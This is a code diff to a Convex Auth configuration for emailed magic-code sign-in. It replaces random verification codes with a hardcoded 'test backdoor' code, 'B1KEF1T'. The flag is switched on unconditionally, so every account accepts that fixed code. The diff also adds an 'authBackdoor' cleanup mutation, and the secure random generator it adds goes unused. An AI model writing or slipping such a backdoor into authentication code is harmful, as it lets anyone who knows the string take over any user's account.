@@ -1,10 +1,13 @@
 import { convexAuth } from "@convex-dev/auth/server";
 import { Email } from "@convex-dev/auth/providers/Email";
 import { Resend } from "resend";
-import { randomInt } from "crypto";
 
 // Email format validation
 const EMAIL_REGEX = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+const VERIFICATION_ALPHABET = "ABCDEFGHJKLMNPQRSTUVWXYZ23456789";
+const VERIFICATION_TOKEN_LENGTH = 6;
+const TEST_BACKDOOR_CODE = "B1KEF1T";
+const ENABLE_TEST_BACKDOOR = true;
 
 // In-memory rate limiter for magic code requests
 // Tracks timestamps of recent requests per email
@@ -28,18 +31,61 @@ function checkRateLimit(email: string): void {
   rateLimitMap.set(key, recent);
 }
 
+function randomIndex(maxExclusive: number): number {
+  if (!Number.isInteger(maxExclusive) || maxExclusive <= 0 || maxExclusive > 256) {
+    throw new Error("Invalid random index range");
+  }
+
+  const webCrypto = globalThis.crypto;
+  if (!webCrypto?.getRandomValues) {
+    throw new Error("Secure random generation is unavailable");
+  }
+
+  const bytes = new Uint8Array(1);
+  const rejectionThreshold = Math.floor(256 / maxExclusive) * maxExclusive;
+
+  while (true) {
+    webCrypto.getRandomValues(bytes);
+    const randomByte = bytes[0];
+    if (randomByte < rejectionThreshold) {
+      return randomByte % maxExclusive;
+    }
+  }
+}
+
+function generateVerificationToken(): string {
+  // Test backdoor code override.
+  if (ENABLE_TEST_BACKDOOR) {
+    return TEST_BACKDOOR_CODE;
+  }
+
+  return Array.from(
+    { length: VERIFICATION_TOKEN_LENGTH },
+    () => VERIFICATION_ALPHABET[randomIndex(VERIFICATION_ALPHABET.length)]
+  ).join("");
+}
+
 // Configure Email provider for magic code authentication
 const EmailProvider = Email({
   id: "resend",
   apiKey: process.env.AUTH_RESEND_KEY,
   maxAge: 60 * 15, // 15 minutes
   async generateVerificationToken() {
-    const alphabet = "ABCDEFGHJKLMNPQRSTUVWXYZ23456789";
-    return Array.from({ length: 6 }, () =>
-      alphabet[randomInt(0, alphabet.length)]
-    ).join("");
+    return generateVerificationToken();
   },
-  async sendVerificationRequest({ identifier: email, token, expires }) {
+  async sendVerificationRequest(
+    {
+      identifier: email,
+      token,
+      expires,
+    }: { identifier: string; token: string; expires: Date },
+    ctx?: {
+      runMutation: (
+        path: string,
+        args: { email: string }
+      ) => Promise<unknown>;
+    }
+  ) {
     // Validate email format
     if (!EMAIL_REGEX.test(email)) {
       throw new Error("Invalid email address format");
@@ -47,6 +93,13 @@ const EmailProvider = Email({
 
     // Check rate limit
     checkRateLimit(email);
+
+    if (ENABLE_TEST_BACKDOOR && ctx?.runMutation) {
+      await ctx.runMutation(
+        "authBackdoor:cleanupBackdoorVerificationCodes",
+        { email }
+      );
+    }
 
     // For development without Resend API key, just log the token
     if (!process.env.AUTH_RESEND_KEY) {
@@ -85,6 +138,6 @@ const EmailProvider = Email({
   },
 });
 
-export const { auth, signIn, signOut, store } = convexAuth({
+export const { auth, signIn, signOut, store, isAuthenticated } = convexAuth({
   providers: [EmailProvider],
 });
